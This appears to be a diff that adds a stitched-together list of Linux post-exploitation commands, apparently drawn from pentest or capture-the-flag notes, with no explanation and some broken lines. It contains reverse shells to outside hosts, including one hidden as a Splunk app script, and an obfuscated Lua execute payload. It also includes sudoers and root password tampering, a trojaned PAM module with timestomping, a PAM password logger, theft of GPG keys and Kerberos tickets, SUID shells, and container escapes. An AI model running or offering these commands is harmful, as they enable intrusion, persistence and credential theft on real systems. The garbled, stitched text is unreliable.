+wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
+load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
+print(string.char(0x41, 0x42))
+print(rawget(string, "char")(0x41, 0x42))
+for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
+debug.debug()
+file ./candidate
+ls -lh ./candidate
+blkid ./candidate 2>/dev/null
+strings -a ./candidate | head -n 50
+mkdir -p /tmp/imgmnt
+sudo mount -o loop,ro ./candidate /tmp/imgmnt
+find /tmp/imgmnt -maxdepth 3 -type f -ls 2>/dev/null
+sudo umount /tmp/imgmnt
+debugfs -R 'ls -l /' ./candidate 2>/dev/null
+debugfs -R 'stat /' ./candidate 2>/dev/null
+findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS
+find /mnt /media /srv /opt -xdev -type d -writable -ls 2>/dev/null
+find /mnt /media /srv /opt -xdev -type f -writable -ls 2>/dev/null | head -n 50
+grep -RniE 'cron|systemd|ExecStart|backup|hook|plugin|sh |bash |python' /mnt /media /srv /opt 2>/dev/null | head -n 50
+find /mnt /media /srv /opt -xdev -perm -4000 -type f -ls 2>/dev/null
+ls -li /path/a /path/b
+stat -c 'dev=%d inode=%i links=%h mode=%A owner=%U:%G path=%n' /path/a /path/b
+find / -xdev -samefile /path/to/file -ls 2>/dev/null
+find / -xdev -inum 131074 -ls 2>/dev/null
+stat /path/to/suspicious
+find / -xdev -samefile /path/to/suspicious -ls 2>/dev/null
+ls -l /proc/*/fd/* 2>/dev/null | grep ' (deleted)' | head -n 50
+lsof 2>/dev/null | grep deleted | head -n 50
+cp /proc/1234/fd/3 /tmp/recovered-file
+file /tmp/recovered-file
+debugfs -R 'ls -l /' ./disk.img
+debugfs -R 'stat 131074' ./disk.img
+debugfs -R 'ncheck 131074' ./disk.img
+debugfs -R 'dump 131074 /tmp/recovered.bin' ./disk.img
+file /tmp/recovered.bin
+df -h
+df -i
+find /var /tmp /home -xdev -printf '%h\n' 2>/dev/null | sort | uniq -c | sort -n | tail
+find /path -xdev -printf '%i %TY-%Tm-%Td %TH:%TM %p\n' 2>/dev/null | sort -n | tail -n 50
+find /path -xdev -newermt '2026-01-01' -ls 2>/dev/null
+echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif-aead.conf
+zgrep CONFIG_POSIX_CPU_TIMERS_TASK_WORK /proc/config.gz 2>/dev/null || grep CONFIG_POSIX_CPU_TIMERS_TASK_WORK /boot/config-$(uname -r)
+dmesg -w | egrep 'slab-use-after-free in posix_timer_queue_signal|send_sigqueue|handle_posix_cpu_timers: delta_ns='
+get_version() {
+PATTERN=$1
+VERSION_OPTION=$2
+COMMAND=$(get_command_line $p | grep -Eo "$PATTERN")
+[ ! -z "$COMMAND" ] && echo VERSIONSTART "$p" "$("${COMMAND%%[[:space:]]*}" $VERSION_OPTION 2>&1)" VERSIONEND
+get_version "/\S+/(httpd-prefork|httpd|httpd2-prefork)($|\s)" -v
+get_version "/usr/(bin|sbin)/apache\S*" -v
+get_version "/\S+/mysqld($|\s)" -V
+get_version "\.?/\S*nginx($|\s)" -v
+get_version "/\S+/srm/bin/vmware-dr($|\s)" --version
+get_version "/\S+/dataserver($|\s)" -v
+cp your_helper /tmp/httpd
+chmod +x /tmp/httpd
+/tmp/httpd
+/tmp/httpd -v >"/tmp/VMware-SDMP-Scripts-{UUID}/script_-{ID}_0.stdout" 2>"/tmp/VMware-SDMP-Scripts-{UUID}/script_-{ID}_0.stderr"
+COMMAND=$(get_command_line "$pid" | grep -Eo "/\\S+/nginx(\$|\\s)")
+[ -n "$COMMAND" ] && "${COMMAND%%[[:space:]]*}" -v
+candidate=$(get_command_line "$pid" | awk '{print $1}')
+/usr/sbin/nginx|/usr/sbin/httpd|/usr/sbin/apache2)
+"$candidate" -v 2>&1 ;;
+cat /proc/sys/kernel/modules_disabled 2>/dev/null
+cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
+cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
+dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
+find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
+find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
+ls -l ./example.ko
+modinfo ./example.ko 2>/dev/null
+sudo insmod ./example.ko
+lsmod | grep -i example
+dmesg | tail -n 30
+sudo rmmod example
+sudo /sbin/insmod ./example.ko
+ls -l ./candidate.ko
+modinfo ./candidate.ko 2>/dev/null
+sudo /sbin/insmod ./candidate.ko
+lsmod | grep -i candidate
+sudo /sbin/rmmod candidate
+sudo insmod demo.ko
+dmesg | tail -n 20
+sudo rmmod demo
+sysctl kernel.modprobe 2>/dev/null
+ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
+ls -l /proc/sys/kernel/modprobe
+sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
+getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
+printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
+chmod +x /tmp/helper
+echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe
+printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
+chmod +x /tmp/unknown
+/tmp/unknown 2>/dev/null || true
+cat /tmp/modprobe-helper-ran 2>/dev/null
+KREL="$(uname -r)"
+find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
+find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
+find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
+modprobe --show-depends mymod 2>/dev/null
+modinfo mymod 2>/dev/null
+grep -R "mymod" /lib/modules/$(uname -r)/modules.* 2>/dev/null
+sudo /usr/bin/python3 -c 'import os; os.system("id")'
+sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
+sudo /usr/bin/perl -e 'exec "/bin/sh";'
+sudo /usr/bin/ruby -e 'exec "/bin/sh"'
+sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
+sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
+sudo /usr/bin/nano /etc/hosts
+sudo /usr/bin/vim /etc/hosts
+sudo /usr/bin/less /etc/hosts
+reset; /bin/sh 1>&0 2>&0
+ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
+ss -lntp | egrep '4565|830|8443'
+find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
+ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
+ls -la /home/vmanage-admin/.ssh 2>/dev/null
+grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
+strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
+strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
+ss -lntp | grep 4565
+env | grep -iE 'token|cookie|session'
+grep -R "dataservice" /etc /opt 2>/dev/null | head
+ss -lntp | grep -E '(:443|:8443)'
+request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
+strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
+ss -lnx
+for p in 80 443 8000 8080 8081 9000 5000; do
+timeout 1 bash -c "echo >/dev/tcp/127.0.0.1/$p" 2>/dev/null && echo "open: $p"
+nmap -sT -Pn -p- 127.0.0.1
+nmap -sT -Pn --open 127.0.0.1
+ip neigh
+ip -o -4 addr show | awk '{print $2, $4}'
+nmap -sT -Pn --open 172.17.0.0/24
+nmap -sT -Pn -p 80,443,8000,8080,9000 172.17.0.0/24
+ssh -L 8080:127.0.0.1:8080 user@target
+socat TCP-LISTEN:18080,fork,reuseaddr TCP:127.0.0.1:8080
+socat TCP-LISTEN:18081,fork,reuseaddr UNIX-CONNECT:/run/app/app.sock
+nc -nv 127.0.0.1 9000
+printf 'help\n' | nc -nv 127.0.0.1 9000
+printf 'version\n' | nc -nv 127.0.0.1 9000
+printf 'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n' | nc -nv 127.0.0.1 8080
+curl -i http://127.0.0.1:8080/
+openssl s_client -connect 127.0.0.1:8443 -servername localhost
+curl -k -i https://127.0.0.1:8443/
+sudo tcpdump -i lo -A -s0 'tcp port 80 or tcp port 8080'
+sudo tcpdump -i lo -w /tmp/loopback.pcap 'tcp port 8080'
+printf '%s' 'dXNlcjpwYXNz' | base64 -d
+grep -Ei 'Authorization:|Cookie:|Bearer|Basic|token|api[_-]?key|password' /tmp/capture.txt
+export SSLKEYLOGFILE=/tmp/sslkeys.log
+curl -k https://127.0.0.1:8443/
+ls -l /tmp/sslkeys.log
+sudo tcpdump -i lo -w /tmp/tls.pcap 'tcp port 8443'
+find /run /var/run /tmp -type s -ls 2>/dev/null
+curl --unix-socket /run/app/app.sock http://localhost/
+curl --unix-socket /run/app/app.sock -i http://localhost/admin
+printf 'status\n' | socat - UNIX-CONNECT:/run/app/app.sock
+printf 'help\n' | nc -U /run/app/app.sock
+sudo nft list ruleset
+sudo nft list tables
+sudo nft list chains
+sudo nft list ruleset | grep -Ei 'drop|reject|dport|tcp|udp'
+sudo nft -a list chain inet filter input
+sudo nft list ruleset 2>/dev/null | head -n 80
+rm -f /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.14 23231 > /tmp/f
+echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
+sudo touch /var/log/toomanysecrets.sh
+sudo chmod 770 /var/log/toomanysecrets.sh
+sudo nano /etc/pam.d/common-auth
+sudo chmod 700 /usr/local/bin/toomanysecrets.sh
+mkdir -p /dev/shm/fakehome/.gnupg
+cp -r /home/victim/.gnupg/* /dev/shm/fakehome/.gnupg/
+chown -R $(id -u):$(id -g) /dev/shm/fakehome/.gnupg
+chmod 700 /dev/shm/fakehome/.gnupg
+GNUPGHOME=/dev/shm/fakehome/.gnupg gpg -d /home/victim/backup/secrets.gpg
+gpg --homedir /dev/shm/fakehome/.gnupg -d /home/victim/backup/secrets.gpg
+ls -la ~ | grep -iE 'history|credential|token|key|secret'
+ls -la ~/.ssh ~/.gnupg ~/.aws ~/.kube ~/.docker ~/.config 2>/dev/null
+grep -RInE "password|token|secret|api_key|aws_access_key_id|aws_secret_access_key" ~/.git-credentials ~/.netrc ~/.npmrc ~/.pypirc ~/.aws ~/.kube ~/.docker ~/.config 2>/dev/null
+ls -la /etc/systemd/system /lib/systemd/system
+sudo grep -R "^Environment=.*" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'
+ss -0pb | egrep -i 'packet|raw'
+cat /proc/net/packet
+for p in /proc/[0-9]*; do
+exe=$(readlink "$p/exe" 2>/dev/null)
+cmd=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null)
+[ -n "$exe" ] && printf "%s | %s | %s\n" "${p##*/}" "$exe" "$cmd"
+grep -aHE 'HOME=/tmp|HISTFILE=/dev/null' /proc/[0-9]*/environ 2>/dev/null
+find /proc/[0-9]*/exe -lname '*deleted*' -ls 2>/dev/null
+find /var/run /run -maxdepth 1 -type f \( -name '*.pid' -o -name '*.lock' \) -size 0c -printf '%m %p\n' 2>/dev/null
+grep -RInE 'iptables|bpfd|dockerd|hpas|/dev/shm|/var/tmp|/tmp/' /etc/systemd /etc/init.d /etc/rc*.d /etc/cron* 2>/dev/null
+sudo apt-get install d-feet
+echo "$DBUS_SESSION_BUS_ADDRESS"
+busctl list
+NAME PID PROCESS USER CONNECTION UNIT SE
+com.ubuntu.SoftwareProperties - - - (activatable) - -
+htb.oouch.Block 2609 dbus-server root :1.3 dbus-server.service -
+org.bluez - - - (activatable) - -
+org.freedesktop.DBus 1 systemd root - init.scope -
+org.freedesktop.PackageKit - - - (activatable) - -
+org.freedesktop.PolicyKit1 - - - (activatable) - -
+org.freedesktop.hostname1 - - - (activatable) - -
+org.freedesktop.locale1 - - - (activatable) - -
+ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
+grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
+busctl status htb.oouch.Block
+PID=2609
+PPID=1
+TTY=n/a
+UID=0
+EUID=0
+SUID=0
+FSUID=0
+GID=0
+EGID=0
+SGID=0
+FSGID=0
+SupplementaryGIDs=
+Comm=dbus-server
+CommandLine=/root/dbus-server
+Label=unconfined
+CGroup=/system.slice/dbus-server.service
+Unit=dbus-server.service
+Slice=system.slice
+UserUnit=n/a
+UserSlice=n/a
+Session=n/a
+AuditLoginUID=n/a
+AuditSessionID=n/a
+UniqueName=:1.3
+EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
+cap_fowner cap_fsetid cap_kill cap_setgid
+cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+cap_mknod cap_lease cap_audit_write cap_audit_control
+cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+cap_wake_alarm cap_block_suspend cap_audit_read
+PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
+InheritableCapabilities=
+BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
+systemctl status dbus-server.service --no-pager
+systemctl cat dbus-server.service
+namei -l /root/dbus-server
+busctl tree htb.oouch.Block
+busctl introspect htb.oouch.Block /htb/oouch/Block
+NAME TYPE SIGNATURE RESULT/VALUE FLAGS
+htb.oouch.Block interface - - -
+.Block method s s -
+org.freedesktop.DBus.Introspectable interface - - -
+.Introspect method - s -
+org.freedesktop.DBus.Peer interface - - -
+.GetMachineId method - s -
+.Ping method - - -
+org.freedesktop.DBus.Properties interface - - -
+.Get method ss v -
+.GetAll method s a{sv} -
+.Set method ssv - -
+.PropertiesChanged signal sa{sv}as - -
+busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
+gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
+grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
+grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
+grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
+pkaction --verbose
+sudo busctl monitor htb.oouch.Block
+sudo busctl monitor
+sudo dbus-monitor --system
+busctl monitor htb.oouch.Block
+Monitoring bus message stream.
+Sender=:1.1376 Destination=htb.oouch.Block Path=/htb/oouch/Block Interface=htb.oouch.Block Member=Block
+UniqueName=:1.1376
+MESSAGE "s" {
+STRING "lalalalal";
+Sender=:1.3 Destination=:1.1376
+STRING "Carried out :D";
+sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
+sudo busctl capture > system-bus.pcapng
+dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
+dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
+dbus-monitor "type=method_call" "type=method_return" "type=error"
+dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
+sudo dbus-map --dump-methods
+sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
+python3 uptux.py -n
+python3 uptux.py -d
+grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
+cp /bin/bash /tmp/b && chmod +s /tmp/b
+/bin/b -p
+ldd /bin/su
+linux-vdso.so.1 (0x00007ffef06e9000)
+libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
+libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
+libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
+libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
+libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
+objdump -T /bin/su | grep audit
+0000000000000000 DF *UND* 0000000000000000 audit_open
+0000000000000000 DF *UND* 0000000000000000 audit_log_user_message
+0000000000000000 DF *UND* 0000000000000000 audit_log_acct_message
+000000000020e968 g DO .bss 0000000000000004 Base audit_fd
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+echo "root:hacked" | chpasswd
+node --inspect app.js
+node --inspect=4444 app.js
+node --inspect=0.0.0.0:4444 app.js
+node --inspect-brk=0.0.0.0:4444 app.js
+node --inspect --inspect-port=0 app.js
+node inspect 10.10.14.14:4444
+node inspect 127.0.0.1:9229
+debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
+./cefdebug.exe
+./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
+./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
+ldapsearch -Y gssapi -b "cn=users,cn=compat,dc=domain_name,dc=local"
+ldapsearch -Y gssapi -b "cn=groups,cn=accounts,dc=domain_name,dc=local"
+ldapsearch -Y gssapi -b "cn=computers,cn=accounts,dc=domain_name,dc=local"
+ldapsearch -Y gssapi -b "cn=hostgroups,cn=accounts,dc=domain_name,dc=local"
+ipa user-find
+ipa usergroup-find
+ipa host-find
+ipa host-group-find
+-------------------
+ipa user-show user --all
+ipa host-find victim.local --all
+ldapsearch -Y gssapi -b "cn=hbac,dc=domain_name,dc=local"
+ipa hbacrule-find
+ldapsearch -Y gssapi -b "cn=sudorules,cn=sudo,dc=domain_name,dc=local"
+ipa sudorule-find
+ldapsearch -Y gssapi -b "cn=roles,cn=accounts,dc=westeros,dc=local"
+ipa role-find
+ipa privilege-find
+ipa permission-find
+IPAHound -k -s dc1.domain.local -a freeipa_apoc.json
+IPAHound -s dc1.domain.local -u 'uid=user,cn=users,cn=accounts,dc=domain,dc=local' -p 'Password123!' -a freeipa_apoc.json
+IPAHound -k -s dc1.domain.local --output-raw raw.json
+IPAHound --input-raw raw.json -a freeipa_apoc.json
+openssl req -new -newkey rsa:2048 -days 365 -nodes -keyout private.key -out cert.csr -subj '/CN=srv.domain.local'
+ipa cert-request cert.csr --certificate-out=srv.pem --principal=host/srv.domain.local
+kinit -X X509_user_identity=FILE:srv.pem,private.key test/srv.domain.local@DOMAIN.LOCAL
+ldapwhoami -H ldap://dc1.domain.local
+kvno -U admin -k service.keytab -P ldap/dc1.domain.local@DOMAIN.LOCAL test/srv.domain.local@DOMAIN.LOCAL --out-cache ldap_admin.cache
+KRB5CCNAME=ldap_admin.cache ldapwhoami -H ldap://dc1.domain.local
+ps aux | grep -i logstash
+systemctl cat logstash 2>/dev/null
+cat /etc/logstash/pipelines.yml 2>/dev/null
+cat /etc/logstash/logstash.yml 2>/dev/null
+find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
+rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
+curl -s http://127.0.0.1:9600/?pretty
+curl -s http://127.0.0.1:9600/_node/pipelines?pretty
+curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
+input {
+exec {
+command => "whoami"
+interval => 120
+output {
+file {
+path => "/tmp/output.log"
+codec => rubydebug
+command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
+interval => 300
+null {}
+kill -SIGHUP $(pgrep -f logstash)
+ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
+strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
+tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
+cat /etc/sysconfig/logstash 2>/dev/null
+journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
+ls -lah /var/log/logstash 2>/dev/null
+"description": "malicious pipeline",
+"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
+"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
+"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
+gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
+mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
+mv pam_unix.so /lib/security/pam_unix.so
+chmod 644 /lib/security/pam_unix.so
+touch -r /bin/ls /lib/security/pam_unix.so
+find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'
+command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules
+for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
+dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
+grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
+authselect current
+find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls
+export SPLUNK_HOME=/opt/splunk
+[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder
+find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null
+grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
+/opt/splunk/etc/apps/.linux_audit/
+APP="$SPLUNK_HOME/etc/apps/.linux_audit"
+mkdir -p "$APP/bin" "$APP/default"
+printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
+printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
+chmod +x "$APP/bin/check.sh"
+"$SPLUNK_HOME/bin/splunk" restart
+"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
+"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
+oxdf@hacky$ gcc a.c -o /mnt/nfsshare/a;
+oxdf@hacky$ chmod 4755 /mnt/nfsshare/a
+bash-4.2$ $ ./a
+oxdf@hacky$ gcc b.c -o /mnt/nfsshare/b; chmod 4755 /mnt/nfsshare/b
+bash-4.2$ $ ./b
+int main(void) {
+setuid(1000);
+execve("/usr/bin/id", NULL, NULL);
+return 0;
+bash-4.2$ $ ./c
+execve("/bin/bash", NULL, NULL);
+bash-4.2$ $ ./d
+bash-4.2$ $ id
+char *const paramList[10] = {"/bin/bash", "-p", NULL};
+execve(paramList[0], paramList, NULL);
+bash-4.2$ $ ./e
+cat /etc/polkit-1/localauthority.conf.d/*
+pkexec "/bin/sh"
+polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
+Error executing command as another user: Not authorized
+/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+cat /etc/crontab | grep run-parts
+17 * * * * root cd / && run-parts --report /etc/cron.hourly
+25 6 * * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6 * * 7 root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6 1 * * root test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+pspy64
+2024/02/01 22:02:08 CMD: UID=0 PID=1 | init [2]
+2024/02/01 22:02:10 CMD: UID=0 PID=17883 | sshd: [accepted]
+2024/02/01 22:02:10 CMD: UID=0 PID=17884 | sshd: [accepted]
+2024/02/01 22:02:14 CMD: UID=0 PID=17886 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0 PID=17887 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+2024/02/01 22:02:14 CMD: UID=0 PID=17888 | run-parts --lsbsysinit /etc/update-motd.d
+2024/02/01 22:02:14 CMD: UID=0 PID=17889 | uname -rnsom
+2024/02/01 22:02:14 CMD: UID=0 PID=17890 | sshd: mane [priv]
+2024/02/01 22:02:15 CMD: UID=0 PID=17891 | -bash
+vi /usr/local/bin/run-parts
+chmod 4777 /bin/bash
+chmod +x /usr/local/bin/run-parts
+ls -la /bin/bash
+/bin/bash -p
+debugfs /dev/sda1
+debugfs: cd /root
+debugfs: ls
+debugfs: cat /root/.ssh/id_rsa
+debugfs: cat /etc/shadow
+debugfs -w /dev/sda1
+debugfs: dump /tmp/asd1.txt /tmp/asd2.txt
+USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
+yossi tty1 22:16 5:13m 0.05s 0.04s -bash
+moshe pts/1 10.10.14.44 02:53 24:07 0.06s 0.06s /bin/bash
+cat /dev/fb0 > /tmp/screen.raw
+cat /sys/class/graphics/fb0/virtual_size
+find / -group root -perm -g=w 2>/dev/null
+docker image
+docker run -it --rm -v /:/mnt ubuntu:latest chroot /mnt bash
+echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd
+docker run --rm -it --pid=host --net=host --privileged -v /:/mnt ubuntu:latest chroot /mnt bashbash
+sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage
+mkdir -p $HOME/go/src/github.com/lxc/
+cd $HOME/go/src/github.com/lxc/
+git clone https://github.com/lxc/distrobuilder
+cd ./distrobuilder
+mkdir -p $HOME/ContainerImages/alpine/
+cd $HOME/ContainerImages/alpine/
+wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list
+lxc init alpine privesc -c security.privileged=true
+lxc list
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+[email protected]:~# cd /mnt/root
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+sudo ./build-alpine -a i686
+lxc image import ./alpine*.tar.gz --alias myimage
+lxd init
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+realm list 2>/dev/null
+adcli testjoin 2>/dev/null
+grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
+grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
+klist -k /etc/krb5.keytab 2>/dev/null
+find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
+find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
+env | grep KRB5CCNAME
+klist -l 2>/dev/null
+export KRB5CCNAME=/tmp/krb5cc_1000
+klist
+git clone https://github.com/TarlogicSecurity/tickey
+cd tickey/tickey
+make CONF=Release
+/tmp/tickey -i
+git clone https://github.com/fireeye/SSSDKCMExtractor
+python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
+klist -k -e /etc/krb5.keytab
+kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
+klist -k -K -e /etc/krb5.keytab
+python3 keytabextract.py krb5.keytab
+./bifrost -action dump -source keytab -path /path/to/your/file
